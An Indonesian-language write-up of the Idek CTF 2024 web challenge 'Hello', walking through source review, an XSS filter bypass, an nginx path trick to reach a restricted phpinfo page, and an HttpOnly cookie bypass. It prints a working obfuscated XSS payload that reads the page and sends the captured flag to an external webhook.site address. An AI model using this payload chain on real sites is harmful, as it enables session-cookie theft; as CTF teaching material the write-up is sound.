---
layout: post
title: "Idek CTF 2024 - Hello [Web]"
date: 2024-08-18 00:00:00
description: "Idek CTF 2024 - Hello [Web] Writeup"
tag:
  - Web
---

Setelah sekian lama tidak update article, kali ini saya akan update mengenai writeup Web Idek CTF 2024 dengan nama challenge "Hello". Saya bikin article ini karena dirasa cukup menarik bagi saya.

**Challenge Description:**\
`Just to warm you up for the next Fight :"D`
`Note: the admin bot is not on the same machine as the challenge itself and the .chal.idek.team:1337 URL should be used for the admin bot URL`

![Chall](http://idek-hello.chal.idek.team:1337/)
![Admin Bot](https://admin-bot.idek.team/idek-hello)
![Attachments](https://idekctf-challenges.storage.googleapis.com/uploads/f64f1dd16fae27e943a8f7dab349e00509f39c63bb2278328ac5783d867fa393/idek-hello.tar.gz)

**Analysis:**\
Karena challenges ini merupakan Whitebox yang diberikan source code, kita harus lakukan source code review terlebih dahulu. Adapun struktur file source code yang diberikan sebagai berikut:

.
├── bot.js
├── docker-compose.yml
├── hello
│   ├── Dockerfile
│   ├── init.sh
│   ├── nginx.conf
│   └── src
│   ├── index.php
│   └── info.php
└── tes.md

3 directories, 8 files

Berdasarkan structure file tersebut, terdapat bot.js yang artinya kemungkinan tipikal challenge Client-Side.
Analisa pertama kita lakukan pada file bot.js:

```javascript
...SNIP...
const visit = async () => {
    let browser;
    try {
        browser = await puppeteer.launch({
            headless: true,
            pipe: true,
            args: [
                "--no-sandbox",
                "--disable-setuid-sandbox",
                "--js-flags=--noexpose_wasm,--jitless",
            ],
            dumpio: true
        });

        const ctx = await browser.createBrowserContext();

        const page = await ctx.newPage();
        await page.goto(CHALLENGE_ORIGIN, { timeout: 3000 });
        await page.setCookie({ name: 'FLAG', value: 'idek{PLACEHOLDER}', httpOnly: true });
        await page.goto(TARGET_URL, { timeout: 3000, waitUntil: 'domcontentloaded' });
        await sleep(5000);

        await browser.close();
        browser = null;
    } catch (err) {
        console.log(err);
    } finally {
        if (browser) await browser.close();
    }
};
...SNIP...
```

Berdasarkan file bot.js tersebut, FLAG berada di cookies bot yang diskenariokan disini sebagai Admin. Dari FLAG yang berada di Cookie tersebut dapat dipastikan ini adalah challenges Cross-site-Scripting (XSS). Tapi perlu di note terlebih dahulu bahwa terdapat attribute cookie berupa "httponly" yang di set menjadi "true". Artinya, terdapat proteksi sehingga kita tidak bisa melakukan stealing cookies menggunakan javascript document.cookie.

Berdasarkan article dari ![HackCommander](https://hackcommander.github.io/posts/2022/11/12/bypass-httponly-via-php-info-page/), kita bisa melakukan bypass HttpOnly dan exfiltrate cookies via PHP Info page.

Analisa kedua kita lakukan pada file index.php:

```php
<?php

function Enhanced_Trim($inp) {
    $trimmed = array("\r", "\n", "\t", "/", " ");
    return str_replace($trimmed, "", $inp);
}

if(isset($_GET['name']))
{
    $name=substr($_GET['name'],0,23);
    echo "Hello, ".Enhanced_Trim($_GET['name']);
}

?>
```

Dari file index.php tersebut, terdapat celah Cross-site-Scripting (XSS) pada parameter "name" yang melakukan render user-input. Tetapi, terdapat filter pada function Enhanced_Trim dimana kita tidak bisa menggunakan karakter "\r", "\n". "\t", "/", dan " " untuk construct payload XSS nya.

Analisa ketiga kita lakukan pada file nginx.conf:

```bash
...SNIP...
location = /info.php {
allow 127.0.0.1;
deny all;
}

location ~ \.php$ {
root    /usr/share/nginx/html;
fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
include fastcgi_params;
fastcgi_pass unix:/var/run/php/php8.2-fpm.sock;
...SNIP...
```

Dari file configuration nginx tersebut, terdapat celah berupa Unsafe Path Restriction ke endpoint /info.php. Apabila kita tidak melakukan research, mungkin kita berfikir file info.php tersebut bukan menjadi jalan untuk mendapatkan FLAG yang ada di cookies Admin. Tetapi, karena sesuai article dari ![HackCommander](https://hackcommander.github.io/posts/2022/11/12/bypass-httponly-via-php-info-page/) bahwa kita bisa exfiltrate cookies via PHP info page, maka page ini sangat berguna. Diketahui web juga menggunakan PHP-FPM.

**How to Solve?**\
Dari hasil analisa yang telah kita lakukan, dapat kita urutkan langkah penyelesaiannya sebagai berikut:

1. Bypass Cross-site-Scripting (XSS) filter pada endpoint /index.php dengan parameter "name" => http://target/index.php?name=payload
2. Bypass Unsafe Path Restriction untuk bisa akses info.php page => http://target/info.php
3. Exfiltrate Admin Cookies via PHP info page

Karena alurnya sudah kita ketahui, langsung saja kita lakukan exploitasi.

Bypass Filter XSS:

1. Bypass " " (spasi) menggunakan null byte %0, referensi dari ![ctftime](https://ctftime.org/writeup/32720)
2. Bypass "/" (slash) menggunakan String.fromCharCode

Bypass Path Restriction Nginx PHP-FPM:

1. Akses ke /info.php yang seharusnya hanya diperbolehkan dari 127.0.0.1 dapat di bypass dengan Path Manipulation => http://target/info.php/index.php ![sumber](https://book.hacktricks.xyz/pentesting-web/proxy-waf-protections-bypass)

Dari teknik bypass yang ditemukan, terbentuklah payload XSS untuk stealing cookies dari PHP info page menggunakan regex sebagai berikut:

```javascript
// Ubah menjadi decimal
fetch("http://idek-hello.chal.idek.team:1337/info.php/index.php")
  .then((response) => response.text())
  .then((data) => {
    const regex = /idek\{.*?\}/g;
    const matches = data.match(regex);
    if (matches) {
      fetch(
        "https://webhook.site/e9f955cb-6075-43a9-a58a-521db006edcd" +
          "?encodedMatches=" +
          btoa(matches),
        { method: "GET" }
      );
    }
  });

// Payload final yang di submit ke bot Admin
http://idek-hello.chal.idek.team:1337/?name=<svg%0Conload=javascript:eval(String.fromCharCode(102,101,116,99,104,40,39,104,116,116,112,58,47,47,105,100,101,107,45,104,101,108,108,111,46,99,104,97,108,46,105,100,101,107,46,116,101,97,109,58,49,51,51,55,47,105,110,102,111,46,112,104,112,47,105,110,100,101,120,46,112,104,112,39,41,46,116,104,101,110,40,114,101,115,112,111,110,115,101,32,61,62,32,114,101,115,112,111,110,115,101,46,116,101,120,116,40,41,41,46,116,104,101,110,40,100,97,116,97,32,61,62,32,123,99,111,110,115,116,32,114,101,103,101,120,32,61,32,47,105,100,101,107,92,123,46,42,63,92,125,47,103,59,99,111,110,115,116,32,109,97,116,99,104,101,115,32,61,32,100,97,116,97,46,109,97,116,99,104,40,114,101,103,101,120,41,59,105,102,32,40,109,97,116,99,104,101,115,41,32,123,102,101,116,99,104,40,39,104,116,116,112,115,58,47,47,119,101,98,104,111,111,107,46,115,105,116,101,47,101,57,102,57,53,53,99,98,45,54,48,55,53,45,52,51,97,57,45,97,53,56,97,45,53,50,49,100,98,48,48,54,101,100,99,100,39,32,43,32,39,63,101,110,99,111,100,101,100,77,97,116,99,104,101,115,61,39,32,43,32,98,116,111,97,40,109,97,116,99,104,101,115,41,44,32,123,32,109,101,116,104,111,100,58,32,39,71,69,84,39,32,125,41,59,125,125,41,59))>
```

Tinggal kirimkan payload final ke Admin Bot, setelah itu Bot akan trigger payload tersebut untuk exfiltrate FLAG via PHP info page dan flag kita dapatkan di webhook.
![Webhook](/assets/img/Idek-CTF-2024-Hello/flag.png)

**Flag**:idek{Ghazy_N3gm_Elbalad},idek{Ghazy_N3gm_Elbalad}
